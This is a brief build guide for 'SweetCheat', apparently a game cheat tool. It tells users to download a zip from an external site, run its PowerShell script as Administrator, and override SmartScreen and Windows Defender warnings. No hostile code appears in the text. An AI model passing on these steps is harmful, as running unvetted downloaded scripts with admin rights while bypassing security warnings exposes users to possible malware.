SweetCheat - Windows Build Instructions
========================================

IMPORTANT: The EXE must be built ON WINDOWS. Our Linux server cannot build
a fully working Windows EXE. Use this simple script.

Step 1: Get the source
----------------------
Download: https://sayfespace.online/trainerhub/desktop-python.zip
Extract to a folder, e.g. C:\SweetCheat-Build

Step 2: Build
-------------
1. Open PowerShell as Administrator
2. cd C:\SweetCheat-Build
3. .\build_windows.ps1
4. Wait ~3-5 minutes

Step 3: Run
-----------
After the build finishes, open:
    dist\SweetCheat\SweetCheat.exe

SmartScreen / Windows Defender
-------------------------------
Right-click SweetCheat.exe → Properties → check "Unblock" at the bottom.
Or click "More info" → "Run anyway" on first launch.
